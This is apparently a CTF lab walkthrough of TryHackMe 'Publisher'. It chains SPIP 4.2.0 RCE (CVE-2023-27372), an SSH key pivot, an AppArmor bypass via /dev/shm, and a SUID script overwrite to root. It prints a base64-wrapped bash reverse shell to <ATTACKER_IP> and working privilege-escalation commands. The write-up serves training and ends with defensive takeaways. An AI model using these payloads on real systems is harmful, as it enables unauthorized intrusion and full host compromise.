---
title: "TryHackMe Publisher — Walkthrough"
date: 2025-11-18 13:00:00 +0300
categories: [TryHackMe, Web]
tags: [spip, cve-2023-27372, docker, apparmor, suid]
pin: false
---

Publisher covers **SPIP CMS 4.2.0 RCE (CVE-2023-27372)** in Docker, SSH pivot to host user **`think`**, then **AppArmor-constrained ash** bypass to overwrite **`/opt/run_container.sh`** and SUID **`bash`**.

## Initial Enumeration

### Nmap scan

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

| Port | Service |
| ---- | ------- |
| 22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 |
| 80 | Apache 2.4.41 — Publisher's Pulse: SPIP Insights & Tips |

Root page is static SPIP marketing content.

## Shell as www-data

### Discovering SPIP CMS

```bash
gobuster dir -u 'http://<TARGET_IP>/' \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 100
```

Finding: **`/spip`** → `http://<TARGET_IP>/spip/`

Source reveals **SPIP 4.2.0**.

### CVE-2023-27372 RCE

Base64-wrap reverse shell to simplify quoting:

```bash
echo -n "bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1'" | base64 -w0
```

Run public PoC:

```bash
python3 CVE-2023-27372.py -u 'http://<TARGET_IP>/spip' \
  -c "echo <B64>|base64 -d|bash"
```

Shell as **`www-data`** inside container **`41c976e507f8`**:

```bash
www-data@41c976e507f8:/home/think/spip/spip$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

User flag: **`/home/think/user.txt`** (35 bytes).

## Shell as think

`/home/think/.ssh/id_rsa` is readable. Download and SSH to **host**:

```bash
ssh -i think_key think@<TARGET_IP>
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

## Shell as root

### SUID run_container

```bash
find / -type f -perm -u=s 2>/dev/null
/usr/sbin/run_container
```

Binary executes **`/opt/run_container.sh`** (confirmed via **`strings`** / Ghidra).

Script appears **world-writable**:

```bash
ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 ...
```

Direct write fails — **AppArmor** on **`/usr/sbin/ash`** shell.

Profile **`/etc/apparmor.d/usr.sbin.ash`** includes:

```text
deny /opt/** w,
deny /tmp/** w,
```

and **`ix`** inheritance for binaries under **`/usr/bin/**`** and **`/usr/sbin/**`**.

### AppArmor bypass

Perl unconfined shell via **`/dev/shm`** (not blocked like **`/tmp`**):

```bash
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

Alternative: copy **`/bin/sh`** to **`/dev/shm`** and execute outside inherited profile paths.

Overwrite handler:

```bash
echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh
/usr/sbin/run_container
ls -la /bin/bash
-rwsr-sr-x 1 root root ... /bin/bash
```

```bash
/bin/bash -p
bash-5.0# wc -c /root/root.txt
35 root.txt
```

## Takeaways

- **SPIP 4.2.0** is vulnerable to unauthenticated RCE — patch or isolate.
- Container keys on disk often pivot to **host SSH**.
- **AppArmor `deny` write rules** on **`ash`** do not confine interpreters launched from **`/dev/shm`**.
